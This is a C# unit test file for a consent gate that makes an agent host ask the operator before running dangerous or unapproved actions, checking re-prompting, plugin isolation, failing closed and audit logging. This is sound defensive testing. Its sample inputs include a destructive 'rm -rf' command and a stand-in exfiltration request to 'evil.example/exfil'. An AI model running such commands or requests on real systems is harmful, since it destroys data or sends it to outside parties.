using Cockpit.Core.Abstractions.Consent;
using Cockpit.Infrastructure.Consent;
using Cockpit.Plugins.Abstractions.Consent;
using FluentAssertions;
using NSubstitute;

namespace Cockpit.Infrastructure.Tests.Consent;

/// <summary>
/// The consent gate is what stands between "an agent asked" and "it ran with my rights", so what these tests hold
/// shut is the ways a gate quietly stops gating: a dangerous action that gets remembered and rides along on a
/// later injected call, an approval that a caller could grant itself, a request that hangs or silently passes when
/// nothing is there to ask.
/// </summary>
public sealed class ConsentServiceTests
{
    private readonly IConsentAuditLog _audit = Substitute.For<IConsentAuditLog>();

    private ConsentService CreateBroker() => new(_audit);

    private static ConsentRequest Request(
        ConsentRisk risk,
        bool allowRemember = false,
        string? paneId = "pane-1",
        string scope = "workflow.command",
        string action = "rm -rf /tmp/x",
        string pluginId = "workflows") =>
        new("Workflow wants to run a command", action, new ConsentSource(paneId, pluginId, "Workflows"), scope, risk, allowRemember);

    /// <summary>
    /// The core safety property: a dangerous action is asked every single time. Even when the operator ticked
    /// "remember" on the first one, the second identical request still stops and asks — otherwise one approval
    /// becomes a standing permission a prompt-injected call can reuse.
    /// </summary>
    [Fact]
    public async Task RequestConsentAsync_DangerousRequest_IsNeverRememberedAcrossCalls()
    {
        var broker = CreateBroker();
        var prompts = new List<ConsentPrompt>();
        broker.PromptOpened += (_, prompt) =>
        {
            prompts.Add(prompt);
            broker.Respond(prompt.Id, ConsentOutcome.Approved, remember: true);
        };

        var request = Request(ConsentRisk.Dangerous, allowRemember: true);
        var first = await broker.RequestConsentAsync(request);
        var second = await broker.RequestConsentAsync(request);

        first.IsApproved.Should().BeTrue();
        second.IsApproved.Should().BeTrue();
        prompts.Should().HaveCount(2, "a dangerous action is asked afresh every time");
        prompts.Should().OnlyContain(prompt => !prompt.CanRemember, "the remember option is never offered for the dangerous class");
        first.Remembered.Should().BeFalse();
    }

    /// <summary>The low-risk counterpart: once remembered, the second identical request is not asked again.</summary>
    [Fact]
    public async Task RequestConsentAsync_LowRiskRememberedScope_SkipsTheSecondPrompt()
    {
        var broker = CreateBroker();
        var prompts = new List<ConsentPrompt>();
        broker.PromptOpened += (_, prompt) =>
        {
            prompts.Add(prompt);
            broker.Respond(prompt.Id, ConsentOutcome.Approved, remember: true);
        };

        var request = Request(ConsentRisk.LowRisk, allowRemember: true, scope: "workflow.http:GET");
        var first = await broker.RequestConsentAsync(request);
        var second = await broker.RequestConsentAsync(request);

        prompts.Should().ContainSingle("the operator chose to remember, so the second request is not asked again");
        first.Remembered.Should().BeTrue();
        second.Should().Be(new ConsentDecision(ConsentOutcome.Approved, Remembered: true));
    }

    /// <summary>
    /// Remember is bound to the exact approved action, not the caller's scope: a different action under a remembered
    /// scope is asked afresh, so the operator always sees the new ground truth (security review AC-47, finding 1).
    /// </summary>
    [Fact]
    public async Task RequestConsentAsync_RememberedScope_DifferentAction_IsAskedAgain()
    {
        var broker = CreateBroker();
        var prompts = new List<ConsentPrompt>();
        broker.PromptOpened += (_, prompt) =>
        {
            prompts.Add(prompt);
            broker.Respond(prompt.Id, ConsentOutcome.Approved, remember: true);
        };

        await broker.RequestConsentAsync(Request(ConsentRisk.LowRisk, allowRemember: true, scope: "workflow.http", action: "GET https://api.github.com/issues"));
        await broker.RequestConsentAsync(Request(ConsentRisk.LowRisk, allowRemember: true, scope: "workflow.http", action: "GET https://evil.example/exfil"));

        prompts.Should().HaveCount(2, "a different action under a remembered scope must be shown and asked, not silently approved");
        prompts[1].Request.Action.Should().Be("GET https://evil.example/exfil", "the operator must see the new action's ground truth");
    }

    /// <summary>
    /// A remembered approval does not carry to another plugin: the host-stamped PluginId is part of the key, so a
    /// second plugin reusing the same pane and scope is asked afresh (security review AC-47, finding 2).
    /// </summary>
    [Fact]
    public async Task RequestConsentAsync_RememberedForOnePlugin_OtherPluginIsAskedAgain()
    {
        var broker = CreateBroker();
        var prompts = new List<ConsentPrompt>();
        broker.PromptOpened += (_, prompt) =>
        {
            prompts.Add(prompt);
            broker.Respond(prompt.Id, ConsentOutcome.Approved, remember: true);
        };

        await broker.RequestConsentAsync(Request(ConsentRisk.LowRisk, allowRemember: true, scope: "shared", action: "GET https://api.github.com/issues", pluginId: "workflows"));
        await broker.RequestConsentAsync(Request(ConsentRisk.LowRisk, allowRemember: true, scope: "shared", action: "GET https://api.github.com/issues", pluginId: "evil-plugin"));

        prompts.Should().HaveCount(2, "another plugin cannot reuse a remembered approval, even on the same pane and scope");
    }

    /// <summary>A remembered scope only skips the class it was granted for: a dangerous request of the same scope still asks.</summary>
    [Fact]
    public async Task RequestConsentAsync_DangerousRequestOnARememberedScope_StillAsks()
    {
        var broker = CreateBroker();
        var prompts = new List<ConsentPrompt>();
        broker.PromptOpened += (_, prompt) =>
        {
            prompts.Add(prompt);
            broker.Respond(prompt.Id, ConsentOutcome.Approved, remember: true);
        };

        await broker.RequestConsentAsync(Request(ConsentRisk.LowRisk, allowRemember: true, scope: "shared.scope"));
        await broker.RequestConsentAsync(Request(ConsentRisk.Dangerous, allowRemember: true, scope: "shared.scope"));

        prompts.Should().HaveCount(2, "a remembered low-risk approval must not silence a dangerous request on the same scope");
    }

    /// <summary>With nothing listening to show a prompt, the gate denies rather than blocking forever or passing silently.</summary>
    [Fact]
    public async Task RequestConsentAsync_NoUiListening_FailsClosed()
    {
        var broker = CreateBroker();

        var decision = await broker.RequestConsentAsync(Request(ConsentRisk.Dangerous));

        decision.Should().Be(ConsentDecision.Denied);
    }

    /// <summary>A request whose caller token is cancelled while it waits is denied, and its prompt is taken down.</summary>
    [Fact]
    public async Task RequestConsentAsync_TokenCancelledWhilePending_DeniesAndClosesThePrompt()
    {
        var broker = CreateBroker();
        var opened = Guid.Empty;
        var closed = new List<Guid>();
        broker.PromptOpened += (_, prompt) => opened = prompt.Id;
        broker.PromptClosed += (_, id) => closed.Add(id);
        using var cts = new CancellationTokenSource();

        var pending = broker.RequestConsentAsync(Request(ConsentRisk.Dangerous), cts.Token);
        await cts.CancelAsync();
        var decision = await pending;

        decision.Should().Be(ConsentDecision.Denied);
        closed.Should().ContainSingle().Which.Should().Be(opened);
    }

    /// <summary>A denial is never remembered, even with the box ticked — so the next request is asked again.</summary>
    [Fact]
    public async Task RequestConsentAsync_DeniedWithRememberTicked_DoesNotRemember()
    {
        var broker = CreateBroker();
        var prompts = new List<ConsentPrompt>();
        broker.PromptOpened += (_, prompt) =>
        {
            prompts.Add(prompt);
            var outcome = prompts.Count == 1 ? ConsentOutcome.Denied : ConsentOutcome.Approved;
            broker.Respond(prompt.Id, outcome, remember: true);
        };

        var request = Request(ConsentRisk.LowRisk, allowRemember: true);
        var first = await broker.RequestConsentAsync(request);
        await broker.RequestConsentAsync(request);

        first.IsApproved.Should().BeFalse();
        prompts.Should().HaveCount(2, "a denial is not remembered");
    }

    [Fact]
    public void Respond_UnknownId_IsIgnored()
    {
        var broker = CreateBroker();

        var act = () => broker.Respond(Guid.NewGuid(), ConsentOutcome.Approved, remember: false);

        act.Should().NotThrow();
    }

    /// <summary>Every decision reaches the audit trail, carrying the ground-truth action rather than any framing.</summary>
    [Fact]
    public async Task RequestConsentAsync_Approved_WritesAnApprovedAuditEntryWithTheGroundTruth()
    {
        var entries = new List<ConsentAuditEntry>();
        _ = _audit.RecordAsync(Arg.Do<ConsentAuditEntry>(entries.Add));
        var broker = CreateBroker();
        broker.PromptOpened += (_, prompt) => broker.Respond(prompt.Id, ConsentOutcome.Approved, remember: false);

        await broker.RequestConsentAsync(Request(ConsentRisk.Dangerous));

        entries.Should().ContainSingle();
        entries[0].Action.Should().Be(ConsentAuditAction.Approved);
        entries[0].ActionText.Should().Be("rm -rf /tmp/x");
        entries[0].PluginId.Should().Be("workflows");
        entries[0].Scope.Should().Be("workflow.command");
    }

    /// <summary>A fail-closed denial is logged too — the "nobody asked but it was refused" line you want afterwards.</summary>
    [Fact]
    public async Task RequestConsentAsync_FailClosed_WritesADeniedAuditEntry()
    {
        var entries = new List<ConsentAuditEntry>();
        _ = _audit.RecordAsync(Arg.Do<ConsentAuditEntry>(entries.Add));
        var broker = CreateBroker();

        await broker.RequestConsentAsync(Request(ConsentRisk.Dangerous));

        entries.Should().ContainSingle();
        entries[0].Action.Should().Be(ConsentAuditAction.Denied);
    }
}
